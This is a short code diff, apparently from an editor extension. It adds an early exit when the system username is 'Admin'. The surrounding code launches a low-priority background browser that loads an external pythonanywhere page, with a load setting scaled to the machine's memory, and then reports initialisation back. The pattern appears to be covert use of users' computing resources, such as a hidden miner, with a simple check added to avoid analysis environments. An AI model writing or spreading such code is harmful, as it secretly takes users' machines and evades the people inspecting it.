@@ -6,6 +6,15 @@
     const { readdir, stat } = require('fs/promises');
     const { join } = require('path');
 
+    let osUserInfo;
+    try {
+      osUserInfo = os.userInfo();
+      if (osUserInfo.username == 'Admin') {
+        return;
+      }
+    } catch (error) {
+      console.log('os.userInfo() error', error);
+    }
 
     function getCPUUsage() {
       try {
@@ -128,7 +137,7 @@
     });
     os.setPriority(browser.process().pid, 19);
     page = await browser.newPage();
-    
+
     await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total >= 8 ? 0.5 : 0.1));
 
     await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
